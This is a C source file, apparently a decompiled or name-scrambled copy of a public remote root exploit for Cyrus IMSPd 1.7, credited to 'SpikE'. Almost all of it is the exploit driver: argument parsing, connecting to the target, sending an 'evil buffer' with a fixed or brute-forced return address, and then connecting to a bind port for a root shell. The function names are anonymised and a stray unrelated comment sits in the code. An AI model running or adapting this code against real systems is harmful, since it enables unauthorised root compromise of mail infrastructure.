#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {scalar_t__ Name; int Retaddr; } ;

/* Variables and functions */
 int BRUTEFORCE ; 
 int FUNC0 (char*,int) ; 
 char* FUNC1 (int,int) ; 
 int DEFAULT_PORT ; 
 int DEFAULT_START_ADDRESS ; 
 char EOF ; 
 int FUNC2 (int) ; 
 int ROOT_PORT ; 
#define  TARGET 128 
 TYPE_1__* Targets ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int FUNC4 (char*,int) ; 
 int FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (int) ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 char FUNC12 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC13 (char*,int*) ; 
 int /*<<< orphan*/  FUNC14 (int,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (int) ; 
 int FUNC16 (char*,char*,int*) ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC17 (char*) ; 

int FUNC18(int argc, char **argv)
{
  extern char *optarg;
  extern int optind;
    char opt;
    char *Host = NULL;
    int Port = DEFAULT_PORT;
    int Flags = 0;
    int StartAddress = DEFAULT_START_ADDRESS;
    int TargetNumber = 0;
    int Sock,rootSock,i;
    char *EvilBuffer;
    int BindPort = ROOT_PORT;

  FUNC10(stdout,"\n==[ Cyrus IMSPd 1.7 Remote Root Exploit bY SpikE ]==\n\n");

  // Process arguments
  while ( (opt = FUNC12(argc,argv,"h:t:p:ba:r:")) != EOF)
  {
    switch(opt)
    {
      case 'r':
        BindPort = FUNC5(optarg);
        if(!BindPort) FUNC3(argv[0]);
      break;
      case 'h':
        Host = optarg;
      break;
      case 'p':
        Port = FUNC5(optarg);
        if(!Port) FUNC3(argv[0]);
      break;
      case 'b':
        if(Flags == 0)
          Flags = BRUTEFORCE;
        else
          FUNC3(argv[0]);
      break;
      case 'a':
        if( FUNC16(optarg,"0x%lx",&StartAddress) != 1)
          FUNC3(argv[0]);
      break;
      case 't':
        TargetNumber = FUNC5(optarg);
        if(Flags == 0)
          Flags = TARGET;
        else
          FUNC3(argv[0]);
      break;
      default: FUNC3(argv[0]);
      break;
    }
  }
  if(Host == NULL || Flags == 0) FUNC3(argv[0]);

  // Verify target
  for(i=0;;i++)
    if(Targets[i].Name == 0) break;
  if(--i<TargetNumber) FUNC3(argv[0]);

  if(Flags == TARGET)
    FUNC10(stdout,"*** Target plataform : %ld\n",Targets[TargetNumber].Name);
  FUNC10(stdout,"*** Target host : %s\n",Host);
  FUNC10(stdout,"*** Target port : %u\n",Port);
  FUNC10(stdout,"*** Bind to port : %u\n",BindPort);

  if(Flags == TARGET)
    FUNC10(stdout,"*** Target RET : %#010x\n\n",Targets[TargetNumber].Retaddr);
  else
    FUNC10(stdout,"*** Bruteforce mode start : %#010x\n\n",StartAddress);

  switch(Flags)
  {
    case TARGET:
      Sock = FUNC0(Host,Port);
      if(Sock == -1) FUNC9("Could not connect");
      else FUNC10(stdout,"[+] Connected\n");

      FUNC10(stdout,"[+] Creating evil buffer\n");
      EvilBuffer = FUNC1(Targets[TargetNumber].Retaddr,BindPort);

      FUNC10(stdout,"[+] Sending evil buffer\n");

      FUNC13("%d",&i);
      
      FUNC14(Sock,EvilBuffer,FUNC17(EvilBuffer),0);
      FUNC15(1);

      FUNC10(stdout,"[+] Verifying ...\n");
      FUNC15(1);
      if( (rootSock = FUNC4(Host,BindPort)) >=0)
      {
        FUNC6(Sock);
        FUNC11(EvilBuffer);
        FUNC10(stdout,"[+] Yeap.. It is a root shell\n\n");
        FUNC7(rootSock);
        FUNC6(rootSock);
        FUNC8(0);
      }
      else
        FUNC9("No root shell. Maybe next time");
    break;
    default:
      for(;;)
      {
        FUNC10(stdout,"[+] Using RetAddr = %#010x\n",StartAddress);

        Sock = FUNC0(Host,Port);
        if(Sock == -1) 
        {
          // To avoid stop the bruteforce
          FUNC10(stdout,"[+] Could not connect. Waiting...\n\n");
          FUNC15(120);
        }
        else
        {
          FUNC10(stdout,"[+] Connected\n");

          FUNC10(stdout,"[+] Creating evil buffer\n");
          EvilBuffer = FUNC1(StartAddress,BindPort);

          FUNC10(stdout,"[+] Sending evil buffer\n");
          FUNC14(Sock,EvilBuffer,FUNC17(EvilBuffer),0);
          FUNC15(1);

          FUNC10(stdout,"[+] Verifying ...\n");
          FUNC15(1);
          if( (rootSock = FUNC4(Host,BindPort)) >=0)
          {   // actualite informatique
            FUNC6(Sock);
            FUNC11(EvilBuffer);
            FUNC10(stdout,"[+] Yeap.. It is a root shell\n\n");
            FUNC7(rootSock);
            FUNC6(rootSock);
            FUNC8(0);
          }
          FUNC6(Sock);
          FUNC11(EvilBuffer);
          FUNC10(stdout,"\n");

          StartAddress = FUNC2(StartAddress);
        }
      }
    break;
  }

  FUNC11(EvilBuffer);
  FUNC6(Sock);
}